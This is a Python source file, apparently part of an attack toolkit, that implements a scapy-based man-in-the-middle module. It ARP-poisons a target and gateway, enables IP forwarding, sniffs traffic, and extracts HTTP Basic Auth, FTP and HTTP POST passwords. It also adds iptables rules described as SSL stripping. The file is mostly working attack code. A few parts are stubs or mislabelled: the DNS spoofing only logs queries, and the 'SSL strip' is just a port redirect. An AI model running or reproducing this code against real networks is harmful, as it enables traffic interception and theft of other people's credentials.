"""
MITM (Man-in-the-Middle) Attack Module
Handles ARP spoofing, packet capture, credential sniffing, DNS spoofing, SSL stripping
"""

import subprocess
import time
import os
from typing import Dict, Callable
from scapy.all import *
import threading


class MITMAttacker:
    """MITM attack implementations"""

    def __init__(self):
        self.is_running = False
        self.captured_packets = []
        self.credentials = []
        self.threads = []

    def attack(self, interface: str, target: str, gateway: str, options: Dict,
               callback: Callable = None, progress_callback: Callable = None) -> Dict:
        """
        Execute MITM attack

        Args:
            interface: Network interface to use
            target: Target IP address
            gateway: Gateway IP address
            options: Attack options (arp_spoof, dns_spoof, ssl_strip, etc.)
            callback: Status callback
            progress_callback: Progress callback

        Returns:
            Dictionary with attack results
        """
        self.is_running = True
        results = {
            'target': target,
            'gateway': gateway,
            'interface': interface,
            'status': 'running',
            'captured_packets': 0,
            'credentials': [],
            'data': {}
        }

        if callback:
            callback(f"[MITM] Starting MITM attack")
            callback(f"[MITM] Target: {target}, Gateway: {gateway}")

        try:
            # Enable IP forwarding
            if callback:
                callback("[MITM] Enabling IP forwarding")
            self._enable_ip_forwarding()

            if progress_callback:
                progress_callback(10)

            # Start ARP spoofing
            if options.get('arp_spoof', True):
                if callback:
                    callback("[ARP] Starting ARP spoofing")
                arp_thread = threading.Thread(
                    target=self._arp_spoof,
                    args=(target, gateway, interface, callback)
                )
                arp_thread.daemon = True
                arp_thread.start()
                self.threads.append(arp_thread)

            if progress_callback:
                progress_callback(30)

            # Start packet capture
            if options.get('packet_capture', True):
                if callback:
                    callback("[CAPTURE] Starting packet capture")
                capture_thread = threading.Thread(
                    target=self._capture_packets,
                    args=(interface, callback, results)
                )
                capture_thread.daemon = True
                capture_thread.start()
                self.threads.append(capture_thread)

            if progress_callback:
                progress_callback(50)

            # DNS spoofing
            if options.get('dns_spoof', False):
                if callback:
                    callback("[DNS] Starting DNS spoofing")
                dns_thread = threading.Thread(
                    target=self._dns_spoof,
                    args=(interface, callback)
                )
                dns_thread.daemon = True
                dns_thread.start()
                self.threads.append(dns_thread)

            if progress_callback:
                progress_callback(70)

            # SSL stripping
            if options.get('ssl_strip', False):
                if callback:
                    callback("[SSL] Starting SSL strip")
                self._setup_ssl_strip(callback)

            # Credential sniffing
            if options.get('credential_sniff', False):
                if callback:
                    callback("[CREDS] Starting credential sniffing")
                cred_thread = threading.Thread(
                    target=self._sniff_credentials,
                    args=(interface, callback, results)
                )
                cred_thread.daemon = True
                cred_thread.start()
                self.threads.append(cred_thread)

            if progress_callback:
                progress_callback(90)

            # Keep attack running
            if callback:
                callback("[MITM] Attack is running. Click Stop to terminate.")

            # Run for a period or until stopped
            timeout = 300  # 5 minutes default
            elapsed = 0
            while self.is_running and elapsed < timeout:
                time.sleep(1)
                elapsed += 1
                if elapsed % 10 == 0 and callback:
                    callback(f"[MITM] Running... {len(self.captured_packets)} packets captured")

            if progress_callback:
                progress_callback(100)

            results['status'] = 'completed'
            results['captured_packets'] = len(self.captured_packets)
            results['credentials'] = self.credentials

        except Exception as e:
            results['status'] = 'error'
            results['error'] = str(e)
            if callback:
                callback(f"[ERROR] {str(e)}")
        finally:
            self._cleanup(callback)

        return results

    def _enable_ip_forwarding(self):
        """Enable IP forwarding"""
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def _disable_ip_forwarding(self):
        """Disable IP forwarding"""
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def _get_mac(self, ip: str) -> str:
        """Get MAC address for IP"""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                        timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None

    def _arp_spoof(self, target_ip: str, gateway_ip: str, interface: str,
                   callback: Callable = None):
        """Send ARP spoof packets"""
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            if callback:
                callback("[ARP] Could not resolve MAC addresses")
            return

        if callback:
            callback(f"[ARP] Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")

        try:
            while self.is_running:
                # Poison target
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=gateway_ip), verbose=False, iface=interface)

                # Poison gateway
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                        psrc=target_ip), verbose=False, iface=interface)

                time.sleep(2)

        except Exception as e:
            if callback:
                callback(f"[ARP] Error: {e}")

    def _restore_arp(self, target_ip: str, gateway_ip: str, interface: str,
                    callback: Callable = None):
        """Restore ARP tables"""
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if target_mac and gateway_mac:
            if callback:
                callback("[ARP] Restoring ARP tables")
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=gateway_mac), count=5,
                    verbose=False, iface=interface)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac), count=5,
                    verbose=False, iface=interface)

    def _capture_packets(self, interface: str, callback: Callable = None,
                        results: Dict = None):
        """Capture network packets"""
        def packet_handler(packet):
            if not self.is_running:
                return

            self.captured_packets.append(packet)

            # Log interesting packets
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = str(packet[Raw].load)
                if any(keyword in payload.lower() for keyword in
                      ['password', 'user', 'login', 'auth']):
                    if callback:
                        callback(f"[INTERCEPT] Interesting packet: {packet.summary()}")

        try:
            sniff(iface=interface, prn=packet_handler, store=False,
                  stop_filter=lambda x: not self.is_running)
        except Exception as e:
            if callback:
                callback(f"[CAPTURE] Error: {e}")

    def _sniff_credentials(self, interface: str, callback: Callable = None,
                          results: Dict = None):
        """Sniff for credentials in traffic"""
        def credential_handler(packet):
            if not self.is_running:
                return

            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = str(packet[Raw].load)

                # HTTP Basic Auth
                if 'Authorization: Basic' in payload:
                    import base64
                    match = re.search(r'Authorization: Basic ([A-Za-z0-9+/=]+)',
                                    payload)
                    if match:
                        try:
                            creds = base64.b64decode(match.group(1)).decode()
                            if callback:
                                callback(f"[CREDS] HTTP Basic Auth: {creds}")
                            self.credentials.append({
                                'type': 'http_basic',
                                'credentials': creds
                            })
                        except Exception:
                            pass

                # FTP credentials
                if packet[TCP].dport == 21 or packet[TCP].sport == 21:
                    if 'USER ' in payload or 'PASS ' in payload:
                        if callback:
                            callback(f"[CREDS] FTP: {payload}")
                        self.credentials.append({
                            'type': 'ftp',
                            'data': payload
                        })

                # HTTP POST data
                if 'POST' in payload and ('password' in payload.lower() or
                                         'passwd' in payload.lower()):
                    if callback:
                        callback(f"[CREDS] HTTP POST with password")
                    self.credentials.append({
                        'type': 'http_post',
                        'data': payload[:500]  # First 500 chars
                    })

        try:
            sniff(iface=interface, prn=credential_handler, store=False,
                  stop_filter=lambda x: not self.is_running)
        except Exception as e:
            if callback:
                callback(f"[CREDS] Error: {e}")

    def _dns_spoof(self, interface: str, callback: Callable = None):
        """DNS spoofing attack"""
        def dns_handler(packet):
            if not self.is_running:
                return

            if packet.haslayer(DNSQR):
                # Spoof DNS response
                if callback and random.random() < 0.1:  # Log 10% of queries
                    callback(f"[DNS] Query: {packet[DNSQR].qname}")
                # Implementation would send spoofed response

        try:
            sniff(iface=interface, filter="udp port 53", prn=dns_handler,
                  store=False, stop_filter=lambda x: not self.is_running)
        except Exception as e:
            if callback:
                callback(f"[DNS] Error: {e}")

    def _setup_ssl_strip(self, callback: Callable = None):
        """Setup SSL stripping with iptables"""
        try:
            # Redirect HTTPS to HTTP
            os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 "
                     "-j REDIRECT --to-port 8080")
            if callback:
                callback("[SSL] SSL strip configured (port 80 -> 8080)")
        except Exception as e:
            if callback:
                callback(f"[SSL] Error: {e}")

    def _cleanup_ssl_strip(self):
        """Cleanup SSL stripping rules"""
        try:
            os.system("iptables -t nat -F")
        except Exception:
            pass

    def stop(self):
        """Stop all MITM attacks"""
        self.is_running = False

    def _cleanup(self, callback: Callable = None):
        """Cleanup after attack"""
        if callback:
            callback("[CLEANUP] Stopping MITM attack and cleaning up")

        self.is_running = False
        self._disable_ip_forwarding()
        self._cleanup_ssl_strip()

        if callback:
            callback("[CLEANUP] Complete")

    def save_capture(self, filename: str) -> bool:
        """Save captured packets to PCAP file"""
        try:
            wrpcap(filename, self.captured_packets)
            return True
        except Exception:
            return False
